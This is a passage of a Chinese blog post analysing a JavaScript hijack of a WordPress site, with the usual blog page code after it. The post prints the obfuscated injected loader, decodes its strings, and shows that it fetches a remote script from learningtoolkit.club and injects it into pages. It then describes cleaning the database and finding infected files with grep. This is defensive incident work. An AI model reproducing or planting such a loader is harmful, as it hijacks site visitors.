class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>));_0x3bc1x8[_0xfcc4[<span class="number">7</span>]]= <span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">116</span>,<span class="number">101</span>,<span class="number">120</span>,<span class="number">116</span>,<span class="number">47</span>,<span class="number">106</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">99</span>,<span class="number">114</span>,<span class="number">105</span>,<span class="number">112</span>,<span class="number">116</span>);_0x3bc1x8[_0xfcc4[<span class="number">8</span>]]= <span class="literal">true</span>;_0x3bc1x8[_0xfcc4[<span class="number">9</span>]]= _0xfcc4[<span class="number">10</span>];_0x3bc1x8[_0xfcc4[<span class="number">11</span>]]= text;<span class="built_in">document</span>[_0xfcc4[<span class="number">13</span>]](<span class="built_in">String</span>[_0xfcc4[<span class="number">0</span>]](<span class="number">104</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">100</span>))[<span class="number">0</span>][_0xfcc4[<span class="number">12</span>]](_0x3bc1x8)&#125;;<span class="keyword">var</span> scrpts=<span class="built_in">document</span>[_0xfcc4[<span class="number">13</span>]](_0xfcc4[<span class="number">14</span>]);<span class="keyword">var</span> n=<span class="literal">true</span>;<span class="keyword">for</span>(<span class="keyword">var</span> i=scrpts[_0xfcc4[<span class="number">15</span>]];i--;)&#123;<span class="keyword">if</span>(scrpts[i][_0xfcc4[<span class="number">9</span>]]== _0xfcc4[<span class="number">10</span>])&#123;n= <span class="literal">false</span>&#125;&#125;;<span class="keyword">if</span>(n== <span class="literal">true</span>)&#123;a()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>首先将0xfcc4进行还原<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> _0xfcc4 = [<span class="string">"\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65"</span>, <span class="string">"\x47\x45\x54"</span>, <span class="string">"\x6F\x70\x65\x6E"</span>, <span class="string">"\x73\x65\x6E\x64"</span>, <span class="string">"\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74"</span>, <span class="string">"\x69\x6E\x64\x65\x78\x4F\x66"</span>, <span class="string">"\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74"</span>, <span class="string">"\x74\x79\x70\x65"</span>, <span class="string">"\x61\x73\x79\x6E\x63"</span>, <span class="string">"\x69\x64"</span>, <span class="string">"\x63\x64\x6E\x37\x38\x39"</span>, <span class="string">"\x73\x72\x63"</span>, <span class="string">"\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64"</span>, <span class="string">"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"</span>, <span class="string">"\x73\x63\x72\x69\x70\x74"</span>, <span class="string">"\x6C\x65\x6E\x67\x74\x68"</span>];</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> element = <span class="built_in">document</span>.getElementById(<span class="string">'code'</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> _0xfcc4) &#123;</span></span><br><span class="line"><span class="javascript">        element.value += _0xfcc4[key] + <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">"code"</span> <span class="attr">cols</span>=<span class="string">"80"</span> <span class="attr">rows</span>=<span class="string">"20"</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"decode()"</span> <span class="attr">value</span>=<span class="string">"解码"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>还原成为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fromCharCode</span><br><span class="line">GET</span><br><span class="line">open</span><br><span class="line">send</span><br><span class="line">responseText</span><br><span class="line">indexOf</span><br><span class="line">createElement</span><br><span class="line"><span class="built_in">type</span></span><br><span class="line">async</span><br><span class="line">id</span><br><span class="line">cdn789</span><br><span class="line">src</span><br><span class="line">appendChild</span><br><span class="line">getElementsByTagName</span><br><span class="line">script</span><br><span class="line">length</span><br></pre></td></tr></table></figure></p>
+<p>剩下的就是一些替换内容，<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = https:<span class="comment">//www.learningtoolkit.club/link.php;</span></span><br><span class="line"><span class="keyword">var</span> get_text = <span class="function"><span class="keyword">function</span> <span class="title">httpGet</span>(<span class="params">_0x3bc1x4</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> _0x3bc1x5 = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    _0x3bc1x5[open](GET, _0x3bc1x4, <span class="literal">false</span>);</span><br><span class="line">    _0x3bc1x5[send](<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">return</span> _0x3bc1x5[responseText]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> text = get_text(url);</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
+<p>看到第一个var url 大概就知道为什么访问网站会出现<a href="https://www.learningtoolkit.club/link.php" target="_blank" rel="noopener">https://www.learningtoolkit.club/link.php</a>; 然后出现mp3.js 接着就跳转了，那么我们将数据库的wp_posts表里面恶意js代码删除<br><img src="/image_upload/2018/10/20181002022643.png" alt="Alt text"><br>观察一下发现wp_posts表里面的内容和网站的自定义页面相似<br>打开自定义的页面真的发现了这个内容<br><img src="/image_upload/2018/10/20181002022203.png" alt="Alt text"></p>
+<p>最后在wp_posts表里面将这些恶意js代码都删除<br>删除后访问网页还是出现了那个link.php 网页继续被劫持</p>
+<p>我登录服务器在网站目录使用grep搜索<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn <span class="string">"_0xfcc4"</span> *</span><br></pre></td></tr></table></figure></p>
+<p>结果显示出来了大概50个文件被感染，50多个文件里面都含有这段js恶意代码<br>最后就只有叫朋友将这些js代码慢慢删除了</p>
+<hr>
+
+      
+    </div>
+    
+    
+    
+
+	<div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+  
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script src="https://cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
+  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+  <p><span>本文标题:</span><a href="/2018/10/02/wordpress-js劫持分析/">wordpress-js劫持分析</a></p>
+  <p><span>文章作者:</span><a href="/" title="访问 smelond 的个人博客">smelond</a></p>
+  <p><span>发布时间:</span>2018年10月02日 - 17:10</p>
+  <p><span>最后更新:</span>2018年10月02日 - 23:10</p>
+  <p><span>原始链接:</span><a href="/2018/10/02/wordpress-js劫持分析/" title="wordpress-js劫持分析">http://smelond.com/2018/10/02/wordpress-js劫持分析/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://smelond.com/2018/10/02/wordpress-js劫持分析/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
+</div>
+<script> 
+    var clipboard = new Clipboard('.fa-clipboard');
+      $(".fa-clipboard").click(function(){
+      clipboard.on('success', function(){
+        swal({   
+          title: "",   
+          text: '复制成功',
+          icon: "success", 
+          showConfirmButton: true
+          });
+        });
+    });  
+</script>
+
+      
+	</div>
+	
+	
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/js劫持/" <i class="fa fa-tag"></i> js劫持</a>
+          
+            <a href="/tags/wordpress/" <i class="fa fa-tag"></i> wordpress</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/04/LFI以及RF(文件包含)伪协议利用小技巧/" rel="next" title="LFI以及RFI(文件包含)伪协议利用小技巧">
+                <i class="fa fa-chevron-left"></i> LFI以及RFI(文件包含)伪协议利用小技巧
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+      <!--MOB SHARE BEGIN-->
+<div class="-mob-share-ui-button -mob-share-open">分享</div>
+<div class="-mob-share-ui" style="display: none">
+    <ul class="-mob-share-list">
+        <li class="-mob-share-weibo"><p>新浪微博</p></li>
+        <li class="-mob-share-tencentweibo"><p>腾讯微博</p></li>
+        <li class="-mob-share-qzone"><p>QQ空间</p></li>
+        <li class="-mob-share-qq"><p>QQ好友</p></li>
+		<li class="-mob-share-weixin"><p>微信</p></li>
+        <li class="-mob-share-renren"><p>人人网</p></li>
+        <li class="-mob-share-kaixin"><p>开心网</p></li>
+        <li class="-mob-share-douban"><p>豆瓣</p></li>
+        <li class="-mob-share-facebook"><p>Facebook</p></li>
+        <li class="-mob-share-twitter"><p>Twitter</p></li>
+    </ul>
+    <div class="-mob-share-close">取消</div>
+</div>
+<div class="-mob-share-ui-bg"></div>
+<script id="-mob-share" src="http://f1.webshare.mob.com/code/mob-share.js?appkey=2501104178e4c"></script>
+<!--MOB SHARE END-->
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8zNTEzOC8xMTY3Mw=="></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/avatar.jpg"
+                alt="smelond" />
+            
+              <p class="site-author-name" itemprop="name">smelond</p>
+              <p class="site-description motion-element" itemprop="description">徒然</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.cnblogs.com/smelond" target="_blank" title="博客园">
+                      
+                        <i class="fa fa-fw fa-globe"></i>博客园</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-bookmark-o"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://hoime.cn" title="French" target="_blank">French</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.tateliao.me" title="吃馒头的猫" target="_blank">吃馒头的猫</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/smelond" title="博客园" target="_blank">博客园</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script type="text/javascript" src="/js/src/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; 2017 -<!--&mdash;--> <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <!--<i class="fa fa-user"></i>-->
+	<i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">smelond</span>
+
+  
+</div>
+
+
+<!--
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共字</span>
+</div>
+
+
+  <span class="post-meta-divider">|</span>
+-->
+
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<!--
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+-->
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("MUl4Q9Que76AMXdf28xsNnU0-gzGzoHsz", "BCUNcAcSudJiHptnu7l55oQw");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?c23ef4e5a9bf75e0a9e008154c1ecf90"></script><script>L2Dwidget.init({});</script></body>
+</html>
+
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
